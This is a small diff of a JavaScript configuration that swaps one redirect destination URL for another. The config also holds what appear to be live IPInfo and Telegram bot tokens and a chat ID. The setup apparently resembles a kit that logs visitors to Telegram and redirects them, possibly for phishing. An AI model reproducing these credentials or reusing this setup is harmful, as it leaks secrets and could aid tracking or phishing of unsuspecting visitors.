@@ -10,7 +10,7 @@ const CONFIG = {
     IPINFO_TOKEN: 'f14749fee64f8f', // Tu token de IPInfo
     TG_TOKEN: '8425620613:AAGtK8DnpmnRcudQp_tIy4kc7MJuq0QUbPE', // Tu Bot Token
     TG_CHAT: '-5084022149', // Tu Chat ID
-    DESTINO: 'https://infoweb-detalles.github.io/aires', 
+    DESTINO: 'https://grupoafinafactura.com/', 
     PORT: process.env.PORT || 3000
 };
 
